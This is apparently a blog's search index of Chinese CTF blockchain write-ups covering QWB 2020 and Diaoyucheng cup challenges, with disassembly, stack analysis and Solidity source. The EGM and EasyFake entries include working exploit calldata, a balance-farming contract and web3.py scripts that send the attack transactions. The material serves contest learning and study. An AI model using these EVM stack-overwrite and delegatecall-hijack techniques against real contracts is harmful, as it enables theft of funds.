<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ctf区块链出题模板 docker部署]]></title>
    <url>%2F2020%2Fblockchain-template%2F</url>
    <content type="text"><![CDATA[ctf 区块链出题模板 docker 一键部署 个人喜欢的出题方式 部署合约的外部账户随机生成，每个选手都不一样，在一定程度上可防止“抄作业” 点我去查看]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[调试evm字节码-radare2]]></title>
    <url>%2F2020%2Fradare2%2F</url>
    <content type="text"><![CDATA[前言 不经意发现的 radare2 也可以调试 EVM bytecode 可调试交易实时查看 stack 和 memory 信息 不断探索好用好玩的功能，不断更新 具体的指令及其操作就靠自己咯 使用如下命令连接到交易调试 1r2 -a evm -D evm &quot;evm://localhost:8545@0x837f83456921c1f38605d87ed7850c0aa668ecce55efbedf9da21d712dd040fe&quot; stack 栈顶在 0x00008fff 位置 memory 位置从 0x10000 开始，所以需要手工调整到 0x10000 ，可使用如下命令 1px 512 @ 0x10000]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>evm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb2020 第四届强网杯区块链EGM]]></title>
    <url>%2F2020%2Fegm%2F</url>
    <content type="text"><![CDATA[前言 第四届 qwb 线下赛 EGM 赛题 WP 考点是 Return Oriented Programming 借用工具 ida-evm 反汇编辅助分析 也可借助在线工具 https://www.trustlook.com/services/smart.html 反编译辅助分析 Source16210000060405260043610610073576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638d715d9d1461024557806360fe47b11461031a5780636d4ce63c1461035557806335f4699414610372578063b4a99a4e1461038157610073565b610078565b600080fd600060006000600060005b61012061010052565b6101005190565b60206101005101806101005252565b6101005151602061010051036101005290565b61010052565b6100ca610100516100975b565b565b6100d66100a6565b6100de6100a6565b6100e7906100b9565b565b6100f1610087565b565b34156100cc57610078565b6101086000610097565b5b7f01000000000000000000000000000000000000000000000000000000000000006101005151602061010051035101510415610152575b60016101005151016101005152610109565b61015a6100a6565b6101626100a6565b506100ce565b6101726000610097565b5b6020610100510351610100515103156101d9577f0100000000000000000000000000000000000000000000000000000000000000610100515160606101005103510151046101005151604061010051035101535b60016101005151016101005152610173565b60006101005151604061010051035101535b60406101005151061561021c5760006101005151604061010051035101535b600161010051510161010051526101eb565b6102246100a6565b5061022d6100a6565b506102366100a6565b5061023f6100a6565b506100ce565b61024d6100e9565b6102576000610097565b610100516102656212345650565b36602462013000376102756100bf565b61028061034f610097565b61028c62013000610097565b61029581610097565b6102a160243603610097565b610168565b6102ae6100bf565b6102b96102c7610097565b6102c281610097565b6100fe565b6020610100510381602060408303526020820352602060208203510660208203510360200160400160408203f35b602061010051035161010051515561030b6100a6565b506103146100a6565b506100ce565b6103226100f3565b61032a6100bf565b61033561034f610097565b610340600435610097565b61034a6000610097565b6102f5565b60006000f35b61035d6100f3565b60005433146100785760005460805260206080f35b60665433141561007857606654ff5b6066543314156100785733606655005b505050505050505050505050505050505050505050505050505050505050505050505050505050 Analyse 使用 https://www.trustlook.com/services/smart.html 分析的结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218contract disassembler &#123; function Backdoor() public return () &#123; var1 = func_00000087(); return(); &#125; function set() public return () &#123; // Please refer to main() for the functionality, Function Hash: 60FE47B1 &#125; function get() public return () &#123; require(!msg.value); return(); &#125; function die() public return () &#123; // Please refer to main() for the functionality, Function Hash: 35F46994 &#125; function Owner() public return () &#123; // Please refer to main() for the functionality, Function Hash: B4A99A4E &#125; function func_00000087() private return (var0) &#123; mstore(0x100,0x120); return(var1); &#125; function func_00000097( uint256 arg0) private return (var0) &#123; temp0 = mload(0x100); mstore(0x100,(temp0 + 0x20)); mstore((temp0 + 0x20),arg0); return(var0); &#125; function func_000000BF() private return (var0) &#123; var4 = mload(0x100); var2 = func_00000097(var4); return(var1); &#125; function func_000000A6() private return (var0) &#123; temp12 = mload(0x100); temp14 = mload(temp12); temp13 = mload(0x100); mstore(0x100,(temp13 - 0x20)); return(temp14); &#125; function func_000000B9( uint256 arg0) private return (var0) &#123; mstore(0x100,arg0); return(var2); &#125; function main() public return () &#123; mstore(0x40,0x100000); if ((msg.data.length &lt; 0x4)) &#123;label_00000073:label_00000078: revert(0x0,0x0); &#125; //ISSUE:COMMENT: Function Backdoor() else if ((0x8D715D9D == uint32((msg.data(0x0) / 0x100000000000000000000000000000000000000000000000000000000)))) &#123; Backdoor(); var0 = func_00000097(0x0); calldatacopy(0x13000,0x24,msg.data.length); var1 = func_000000BF(); var1 = func_00000097(0x34F); var1 = func_00000097(0x13000); var1 = func_00000097(var1); var1 = func_00000097((msg.data.length - 0x24)); var1 = func_00000097(0x0);label_00000173: temp2 = mload(0x100); temp5 = mload((temp2 - 0x20)); temp3 = mload(0x100); temp4 = mload(temp3); if ((temp4 - temp5)) &#123; temp22 = mload(0x100); temp25 = mload(temp22); temp23 = mload(0x100); temp24 = mload((temp23 - 0x60)); temp26 = mload((temp24 + temp25)); temp27 = mload(0x100); temp30 = mload(temp27); temp28 = mload(0x100); temp29 = mload((temp28 - 0x40)); mstore8((temp29 + temp30),(temp26 / 0x100000000000000000000000000000000000000000000000000000000000000)); temp31 = mload(0x100); temp32 = mload(temp31); temp33 = mload(0x100); mstore(temp33,(temp32 + 0x1)); goto label_00000173; &#125; else &#123; temp6 = mload(0x100); temp9 = mload(temp6); temp7 = mload(0x100); temp8 = mload((temp7 - 0x40)); mstore8((temp8 + temp9),0x0);label_000001EB: temp10 = mload(0x100); temp11 = mload(temp10); if (MOD(temp11,0x40)) &#123; temp15 = mload(0x100); temp18 = mload(temp15); temp16 = mload(0x100); temp17 = mload((temp16 - 0x40)); mstore8((temp17 + temp18),0x0); temp19 = mload(0x100); temp20 = mload(temp19); temp21 = mload(0x100); mstore(temp21,(temp20 + 0x1)); goto label_000001EB; &#125; else &#123; var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var3 = func_000000A6(); var3 = 0xE7; var2 = func_000000B9(var3); &#125; &#125; &#125; //ISSUE:COMMENT: Function set() else if ((0x60FE47B1 == var0)) &#123; get(); var0 = func_000000BF(); var0 = func_00000097(0x34F); var0 = func_00000097(msg.data(0x4)); var0 = func_00000097(0x0); temp34 = mload(0x100); temp37 = mload((temp34 - 0x20)); temp35 = mload(0x100); temp36 = mload(temp35); sstore(temp36,temp37); var1 = func_000000A6(); var1 = func_000000A6(); var1 = func_000000A6(); var2 = func_000000A6(); var2 = 0xE7; var1 = func_000000B9(var2); &#125; //ISSUE:COMMENT: Function get() else if ((0x6D4CE63C == var0)) &#123; get(); if ((msg.sender == sload(0x0))) &#123; goto label_00000078; &#125; else &#123; mstore(0x80,sload(0x0)); RETURN(0x80,0x20); &#125; &#125; //ISSUE:COMMENT: Function die() else if ((0x35F46994 == var0)) &#123; if ((msg.sender == sload(0x66))) &#123; //ISSUE:WARNING: SELFDESTRUCT is used to for the destruction selfdestruct(sload(0x66)); &#125; else &#123; goto label_00000078; &#125; &#125; //ISSUE:COMMENT: Function Owner() else if ((0xB4A99A4E == var0)) &#123; if ((msg.sender == sload(0x66))) &#123; sstore(0x66,msg.sender); stop(); &#125; else &#123; goto label_00000078; &#125; &#125; else &#123; goto label_00000073; &#125; &#125;&#125; 根据上面反编译结果及其 ida-evm 具体分析一下可以得到下面的伪代码 12345678910111213141516function get() public returns (address) &#123; require(msg.value == 0); require(msg.sender != sload(0x0)); return sload(0x0);&#125;function die() public &#123; require(msg.sender == sload(0x66)); selfdestruct(sload(0x66));&#125;function Owner() public &#123; require(msg.sender == sload(0x66)); sstore(0x66,msg.sender); stop();&#125; 根据反编译结果及其 ida-evm 具体分析 set 函数和 Backdoor 函数，可发现其利用 mem 实现了类堆栈操作，可总结如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function stack_push(uint256 value) private &#123; memory[memory[0x100]+0x20] = value; memory[0x100] = memory[0x100] + 0x20;&#125;function stack_get(uint256 depth) private &#123; return memory[memory[0x100] - depth*0x20];&#125;function stack_pop() private returns (uint256 value) &#123; value = memory[memory[0x100]]; memory[0x100] = memory[0x100] - 0x20;&#125;function stack_push_frame() private &#123; stack_push(memory[0x100]);&#125;function stack_pop_frame() private returns (uint256 dest) &#123; dest = stack_pop(); memory[0x100] = stack_pop();&#125;function set(uint256 value) public &#123; stack_push_frame(); stack_push(0x34f); stack_push(value); stack_push(0x00); set_ss();&#125;function set_ss() private &#123; sstore(sload(0x0),sload(0x1)); stack_pop(); stack_pop(); goto stack_pop_frame();&#125;function Backdoor() public &#123; memory[0x100] = 0x120; var var1 = memory[0x100]; // 0x140 stack_push(0x00); memcpy(memory[0x13000], msg.data[0x24], msg.data.length-0x24); stack_push_frame(); stack_push(irrelevant_lbl); stack_push(0x13000); stack_push(var1); stack_push(msg.data.length - 0x24); stack_push(0x00); copy_data(); memory[stack_get(2) + stack_get(0)] = 0x00; pad_data(); stack_pop(); stack_pop(); stack_pop(); stack_pop(); goto stack_pop_frame();&#125;function copy_data() private &#123; while (stack_get(0) - stack_get(1) != 0) &#123; memory[stack_get(2) + stack_get(0)] = memory[stack_get(3) + stack_get(0)] &gt;&gt; 248; memory[memory[0x100]] = memory[memory[0x100]] + 0x01; &#125;&#125;function pad_data() private &#123; while (stack_get(0) % 0x40 != 0) &#123; memory[stack_get(2) + stack_get(0)] = 0x00; memory[memory[0x100]] = memory[memory[0x100]] + 0x01; &#125;&#125; 其中 set 对应的堆栈如下 123456789--------------------------------| stack frame set() |--------------------------------| address of &apos;return&apos; gadget | |-------------------------------- | stack grows down| our address | V--------------------------------| 0x66 |-------------------------------- Backdoor 对应的堆栈如下 123456789101112131415----------------------------------| 0x00 | &lt;---- this is 0x140----------------------------------| stack frame 0x7909947a() |----------------------------------| address of &apos;return&apos; gadget | |---------------------------------- | stack grows down| 0x13000 | V----------------------------------| 0x140 |----------------------------------| msg.data.length - 0x24 |----------------------------------| 0x00 |---------------------------------- 当调用 Backdoor 时，它会将 msg.data[0x24:] 复制到内存 [0x140] 中。 这意味着如果我们的消息长于 0x20 字节，它将破坏堆栈，然后覆盖返回地址，以此类推。Backdoor 中将 payload 复制到内存 [0x13000] 中。 因此，我们可以简单地更新堆栈帧指针，并使其指向我们的堆栈所在的 0x13000 处 我们需要对 Backdoor 进行调用，msg.data[0x24:] 后的数据每 0x20 长度为一个单位，先是一个单位的 0 填充 0x140 位置，接着两个单位覆盖堆栈帧指针和返回地址。总的 msg.data 长度为 0x144 字节，所以 msg.data[24:] 长度为 0x120 字节，所以假堆栈帧指针指向 0x13120 。根据 set_ss 所在的位置，使用 0x2f5 作为返回位置。因为payload 是一次一个字节复制到 mem 中，所以在覆盖接下来的四个单位时需要注意：前三个是静态值，第四个是是动态值（需要注意，此时的第三个单位要按照 0x40 长度对齐，所以第三个单位是0x140），此时 payload 如下所示： 123456789data = &apos;0x8d715d9d&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013120&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000000df&apos; 最后，可以构造 set_ss，并使用其对堆栈进行读取操作。首先指定 set_ss 的返回地址为0x34f能够正常结束；然后，指定要写入存储的值；最后指定要写入的存储槽 0x66 123000000000000000000000000000000000000000000000000000000000000034f0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C000010000000000000000000000000000000000000000000000000000000000000066 所以，总的 payload 如下所示： 123456789101112data = &apos;0x8d715d9d&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013120&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000000df&apos;data += &apos;000000000000000000000000000000000000000000000000000000000000034f&apos;data += &apos;0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C00001&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000066&apos; 最后调用 die 即可 Exp1234567891011121314151617181920212223242526272829303132333435363738from web3 import Web3, HTTPProviderw3 = Web3(Web3.HTTPProvider("http://192.168.100.8:8888"))contract_address = "0xcbfa6049c0a04031ac0335afe323e3f993856e76"private = "3669a3b95e09cdb89777d777d63147bd7357fcce9219ce1f8e465b86b1135c59"public = "0x8F348B14089Bc472DE7bC954F3ABB7e169C00001"data = '0x8d715d9d'data += '0000000000000000000000000000000000000000000000000000000000000000'data += '0000000000000000000000000000000000000000000000000000000000000000'data += '0000000000000000000000000000000000000000000000000000000000013120'data += '00000000000000000000000000000000000000000000000000000000000002f5'data += '0000000000000000000000000000000000000000000000000000000000013000'data += '0000000000000000000000000000000000000000000000000000000000000140'data += '0000000000000000000000000000000000000000000000000000000000000140'data += '00000000000000000000000000000000000000000000000000000000000000df'data += '000000000000000000000000000000000000000000000000000000000000034f'data += '0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C00001'data += '0000000000000000000000000000000000000000000000000000000000000066'def hack(public, data): txn = &#123; 'from': Web3.toChecksumAddress(public), 'to': Web3.toChecksumAddress(contract_address), 'gasPrice': w3.eth.gasPrice, 'gas': 8000000, 'nonce': w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), 'data': data, &#125; signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print("txn_hash=", txn_hash) return txn_receiptprint(hack(public, data))print(hack(public, '0x35f46994'))]]></content>
      <categories>
        <category>qwb2020</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>qwb2020</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一届钓鱼城杯 strictmathematician WP]]></title>
    <url>%2F2020%2Fstrictmathematician%2F</url>
    <content type="text"><![CDATA[前言 第一届钓鱼城杯，2020线上智博会 strictmathmatician 的 WP 题目很简单，考察的其实是storage存储，主要涉及动态数组和map类型数据 题目没给的那部分代码其实只是对map(address)对应的数组长度的限制，如果题目分析的比较透彻，这部分是不会造成影响的，因为比赛只有一天，后来直接给了完整的源码 Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108pragma solidity ^0.4.23;contract StrictMathematician &#123; address owner; string private constant welcome = &quot;Oh, fantansitic baby! I am a strict mathematician&quot;; uint randomNumber = 0; uint createtime = now; constructor() public payable&#123; owner = msg.sender; &#125; struct Target &#123; function() internal callback; uint32 value; address origin; address sender; bytes12 hash; uint time; &#125; Target[] Targets; struct FailLog &#123; uint idx; address origin; uint time; bytes12 guessnum; address sender; &#125; mapping(address =&gt; FailLog[]) FailLogs; event SendFlag(address addr); function start(bytes12 hash) public payable &#123; Target target; target.origin = tx.origin; target.sender = msg.sender; target.hash = hash; require(msg.value == 1 ether); target.value += 1; Targets.push(target); &#125; function guess(uint idx, bytes12 num) public &#123; if (bytes12(keccak256(abi.encodePacked(num))) != Targets[idx].hash) &#123; FailLog faillog; faillog.idx = idx; faillog.time = now; faillog.origin = tx.origin; faillog.sender = msg.sender; faillog.guessnum = num; FailLogs[msg.sender].push(faillog); &#125; else &#123; Target target = Targets[idx]; target.value += 1; &#125; &#125; function check(uint idx, uint tmp) public &#123; uint maxlen = check_len(address(msg.sender)) + tmp * 3 / 4 ; require(uint(read_slot(uint(cal_mapaddr(uint(msg.sender),4)))) &lt;= maxlen); require(tmp != 0); Target target = Targets[idx+tmp]; require(uint32(target.value+1)==0); target.callback(); &#125; function payforflag() public payable &#123; require(address(this).balance == 0); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function read_slot(uint k) internal view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125; &#125; function cal_mapaddr(uint k, uint p) internal pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(k, p)); &#125; function cal_arrayaddr(uint p) internal pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p)); &#125; function check_len(address addr) internal pure returns(uint maxlen)&#123; uint res = uint(cal_arrayaddr(uint(cal_mapaddr(uint(addr),4)))); uint sum = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff; uint begin = uint(keccak256(abi.encodePacked(uint(3)))); uint distance; uint remainder; if (res&gt;begin) &#123; distance = res - begin; &#125; else&#123; distance = sum - begin + res + 1; &#125; remainder = distance % 3; if (remainder==0) &#123; maxlen = 1; &#125; else if (remainder==1) &#123; maxlen = 3; &#125; else &#123; maxlen = 2; &#125; &#125;&#125; Analyse 调用 start(0x000000000000000000000000) 调用 guess(0, 0xffffffff0000000000000153) 一次 计算 target = kecaak256(keccak256(addr|4))+3 计算 base = keccak256(3) distance = (2**256-base+target) % (2**256), idx = distance // 3 若 distance % 3 = 0, 则 idx = idx 若 distance % 3 = 1, 则 idx += 4 ,调用 guess(0, 0xffffffff0000000000000153) 两次 若 distance % 3 = 2, 则 idx += 2 ,掉用 guess(0, 0xffffffff0000000000000153) 一次 调用 guess(0, 0xffffffff0000000000000153) 三次 调用 check(idx, 4) ，其中 tmp 为 4 的倍数，在调用 check 之前需调用 guess(0, 0xffffffff0000000000000153) 的次数为 tmp*3/4]]></content>
      <categories>
        <category>钓鱼城杯</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>钓鱼城杯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb2020 第四届强网杯区块链线上赛]]></title>
    <url>%2F2020%2Fqwb2020%2F</url>
    <content type="text"><![CDATA[前言 第四届 qwb，blockchains 的 WP，勿喷 题目考查的点子也不是很新，勿喷2333 随时欢迎大家来交流，别喷就好，谢谢 没有官方 WP ，我只是自己写着玩 IPFS 题目考查的是最近很火的 IPFS ，不过很简单，考查的是 IPFS 存储规则计算的相关知识，不过题目可能描述的不清楚，导致有些选手不明白 hash 是什么意思2333，再加上最后找到两张图片，可是提交的 flag 不对，导致选手以为是脑洞题目，自己在那猜 hash 到底是什么，其实并不是，是因为 pic1 被指定大小分块存储了，所以你直接按照一个块计算的 cid 结果不对，在此说声抱歉，其实 hash 就是文件的 cid，出题的时候没有考虑到这一点，所以题目目的不是为了脑洞，在此解释一下，不过看了绝大多数队伍的 WP 发现他们理解的没有偏差，我也不明白为什么 需要了解一下 IPFS 是如何计算文件 hash 的，即 cid，简化总结为：原始数据添加元数据封装成 IPFS 文件 -&gt; 计算 SHA2-256 -&gt; 封装成 multihash -&gt; 转换成 Base58 所以对于 pic2.jpg ，我们计算它的 multihash 然后转 Base58 即可，可使用如下脚本计算 12import base58print base58.b58encode_int(int("1220659c2a2c3ed5e50f848135eea4d3ead3fa2607e2102ae73fafe8f82378ce1d1e", 16)) 计算结果为 QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 ，所以我们直接访问 https://ipfs.io/ipfs/QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 即可 对于 pic1.jpg ，考查的是 IPFS 文件的碎片化存储，IPFS 默认规则是文件所占空间大于 256kb 就会被切分成小块，每一块小于或等于 256kb 。不过我们上传时可以指定碎片化的大小，使用 -s size-? 参数即可，题目是把 pic1.jpg 碎片化成了 6 个 block ，分别给出了它们的文件 hash 值，所以我们只需要将其拼成一张图片即可，排列组合即可(可以先找到文件头所在的 block 和文件尾所在的 block ，对剩余 4 个 block 排列组合) 排列组合的脚本如下，3.jpg 便是 pic1.jpg 1234567891011121314import osimport itertoolsl = ["QmZkF524d8HWfF8k2yLrZwFz9PtaYgCwy3UqJP5Ahk5aXH", "Qme7fkoP2scbqRPaVv6JEiaMjcPZ58NYMnUxKAvb2paey2", "QmU59LjvcC1ueMdLVFve8je6vBY48vkEYDQZFiAbpgX9mf", "QmfUbHZQ95XKu9vd5XCerhKPsogRdYHkwx8mVFh5pwfNzE"]index = 1for i in itertools.permutations('0123', 4): os.system("ipfs cat QmXh6p3DGKfvEVwdvtbiH7SPsmLDfL7LXrowAZtQjkjw73 &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) for j in i: print j os.system("ipfs cat " + l[int(j)] + " &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) os.system("ipfs cat QmXFSNiJ8BdbUKPAsu3oueziyYqeYhi3iyQPXgVSvqTBtN &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) print(index) index = index + 1 得到信息 flag=flag{md5(hash1+hash2)} ，所以我们需要找到 hash1 ，很简单，只需要我们重新上传一下 pic1.jpg 即可，size 的大小可以根据分块 block 对应的文件的大小获得 1ipfs add -s size-26624 pic1.jpg 得到 hash1 = QmYjQSMMux72UH4d6HX7tKVFaP27UzC65cRchbVAsh96Q7 flag=flag{md5(hash1+hash2)}=flag{35fb9b3fe44919974a02c26f34369b8e} EasyFake 思路来自 rw2018 首席的题目，觉得点子很好，直接把首席题目的点子拿了过来23333，勿喷，简化版 可以借助 ida-evm 等工具查看其函数调用图及其细节 薅羊毛是送分的，考点是 delegatecall ，直接介绍利用思路 Source1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pragma solidity ^0.4.23;contract EasyFake &#123; uint public qwb_version = 4; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public status; string public constant hello = &quot;Welcome to S4 of qwb! Enjoy yourself :D&quot;; uint private constant randomNumber = 0; event SendFlag(address addr); constructor() public &#123; assembly &#123; sstore(0x1234, 0x4804a623) &#125; &#125; modifier onlyHuman&#123; uint size; address addr = msg.sender; assembly &#123; size := extcodesize(addr) &#125; require(size==0); _; &#125; function gift() public payable &#123; require(status[msg.sender]==0); balanceOf[msg.sender] += 10; status[msg.sender] = 1; &#125; function transferbalance(address to,uint amount) public &#123; require(balanceOf[msg.sender]&gt;=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; &#125; function payforflag(string s) public payable onlyHuman &#123; require(keccak256(abi.encodePacked(s)) == keccak256(&quot;iloveqwb&quot;)); if (balanceOf[msg.sender]&gt;=1000 &amp;&amp; msg.value == 1 ether) &#123; assembly &#123; mstore(0x800, 0x1234) mload(0x800) dup1 mstore(0x2000, 0x06ee) mload(0x2000) and(caller, 0xffff) jump pop pop pop &#125; &#125; else &#123; selfdestruct(msg.sender); &#125; &#125; function backdoor() public &#123; assembly &#123; mstore(0x2000,0x20) mload(0x2000) mstore(0x2000,0x0) mstore(0x2100,0x1234) mload(0x2100) mstore(0x2100,0) sload(extcodesize(caller)) mstore(0x20, sload(0x1234)) mstore(0x5000,0x3c) mload(0x5000) mstore(0x5000, 0x0) calldataload(0x7e) gas calldataload(0x5e) jump pop pop pop pop pop pop &#125; &#125; function() public payable &#123;&#125;&#125; Analyse 对上述源码编译生成的字节码进行了一些改动，完整的字节码可在链上查找到 题目要求触发 SendFlag 事件，可是并没有 SendFlag ，所以需要 delegatecall ，这个意图应该很明显 对于 backdoor 函数，其函数栈如下所示，会跳转到 calldataload(0x5e) ，这个很明显，我们要跳转到 delegatecall 的位置，查看字节码，可以找到位置为 0x740 ，所以 calldataload(0x5e:0x7e)=0x740 。并且设置了 memory[0x20,0x40]=sload(0x1234)=0x4804a623 ，可在https://www.4byte.directory/查询到是 getflag() 函数 1234567calldataload(0x5e) 栈顶gasRemainingcalldataload(0x7e)0x3c0x40x12340x20 栈底 0x740 位置代码为 5bf45056，即如下 1234JUMPDESTdelegatecallpopjump delegatecall 参数对应栈如下，所以 calldataload(0x7e:0x9e)为delegatecall 调用的 hack 合约地址，memory[0x3c:0x40]=0x4804a623 ，即调用 hack 合约中的 getflag() 函数，返回值保存在 memory[0x1234:0x1234+0x20] 中 123456gas gasRemainingaddr calldataload(0x7e)argsOffset 0x3cargsLength 0x4retOffset 0x1234retLength 0x20 栈底 调用完函数栈为空，但此时有个 jump ，要跳转到哪里呢，我们向上找，发现 payforflag 里面有一些操作，栈详情如下，存在一个任意 caller 控制的跳转 1234caller &amp; 0xffff0x6ee0x12340x1234 假设跳转到 backdoor 位置，即 0x06f2 ，即要求 caller 最低四字节为 0x06f2 ，结合上面的分析，上述执行完 delegatecall 之后会跳转到 0x6ee ，查看 0x6ee 处的字节码是 5b510156 ，操作码如下 1234JUMPDESTMLOADADDJUMP 此时栈变成了下面这样，即会跳转到 mload(0x1234)+0x1234 ，此时栈为空，而 123addmload(0x1234)0x1234 为了保持栈平衡，我们需要跳转到 stop 的位置，正常结束并维持栈平衡，可以找到 0x2c1 位置，即 mload(0x1234)+0x1234=0x2c1 即可，即要求 hack 合约中的 getflag() 函数返回值为 0x2c1-0x1234=0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff08d Exp 使用下面代码薅羊毛，转到地址最后四字节为 0x06f2 12345678910111213141516contract father &#123; constructor() public &#123; for (uint i=0; i&lt;100; i++) &#123; son ason = new son(); &#125; &#125;&#125;contract son &#123; constructor() public &#123; EasyFake tmp = EasyFake(0x742eB40659c7Dae2CD436B9E2741696a2F622DB2); tmp.gift(); tmp.transferbalance(address(0x15697F62095549B50F2897F6840D36aB1e0b06f2),10); &#125;&#125; 部署 hack 合约，作为 delegatecall 参数 1234567contract hack &#123; event SendFlag(address addr); function getflag() payable public returns(uint256) &#123; emit SendFlag(msg.sender); return 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff08d; &#125;&#125; 使用最后四字节 0x06f2 的这个账户调用 payforflag 函数，根据如上分析，payload 如下所示 12345678910111213141516171819202122232425262728293031323334from web3 import Web3, HTTPProviderw3 = Web3(Web3.HTTPProvider(&apos;https://ropsten.infura.io/v3/xxxxxxxxxxx&apos;))# contract_instance = web3.eth.contract(address=config[&apos;address&apos;], abi=config[&apos;abi&apos;])contract_address = &quot;0x742eB40659c7Dae2CD436B9E2741696a2F622DB2&quot;private = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;public = &quot;0x15697F62095549B50F2897F6840D36aB1e0b06f2&quot;data = &apos;0x6bc344bc&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000020&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000008&apos;data += &apos;696c6f7665717762000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000740&apos;data += &apos;000000000000000000000000882DfFd71DFb9A8f0E5985207587ebd77611A9f3&apos;data += &apos;0000&apos;def do_callme(public): txn = &#123; &apos;from&apos;: Web3.toChecksumAddress(public), &apos;to&apos;: Web3.toChecksumAddress(contract_address), &apos;gasPrice&apos;: w3.eth.gasPrice, &apos;gas&apos;: 8000000, &apos;nonce&apos;: w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), &apos;value&apos;: Web3.toWei(1, &apos;ether&apos;), &apos;data&apos;: data, &#125; signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print(&quot;txn_hash=&quot;, txn_hash) return txn_receiptprint(do_callme(public)) EasyAssembly 题目思路来自于 rw2019 考点有两个： 在合约字节码后进行 padding 不会影响合约的部署 create2 创建地址的方式 Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108pragma solidity ^0.5.10;contract EasyAssembly &#123; event SendFlag(address addr); uint randomNumber = 0; bytes32 private constant ownerslot = keccak256(&apos;Welcome to qwb!!! You will find this so easy ~ Happy happy :D&apos;); bytes32[] public puzzle; uint count = 0; mapping(address=&gt;bytes32) WinChecksum; constructor() public payable &#123; setAddress(ownerslot, msg.sender); &#125; modifier onlyWin(bytes memory code) &#123; require(WinChecksum[msg.sender] != 0); bytes32 tmp = keccak256(abi.encodePacked(code)); address target; assembly &#123; let t1,t2,t3 t1 := and(tmp, 0xffffffffffffffff) t2 := and(shr(0x40,tmp), 0xffffffffffffffff) t3 := and(shr(0x80,tmp), 0xffffffff) target := xor(mul(xor(mul(t3, 0x10000000000000000), t2), 0x10000000000000000), t1) &#125; require(address(target)==msg.sender); _; &#125; function setAddress(bytes32 _slot, address _address) internal &#123; bytes32 s = _slot; assembly &#123; sstore(s, _address) &#125; &#125; function deploy(bytes memory code) internal returns(address addr) &#123; assembly &#123; addr := create2(0, add(code, 0x20), mload(code), 0x1234) if eq(extcodesize(addr), 0) &#123; revert(0, 0) &#125; &#125; &#125; function gift() public payable &#123; require(count == 0); count += 1; if(msg.value &gt;= address(this).balance)&#123; emit SendFlag(msg.sender); &#125;else&#123; 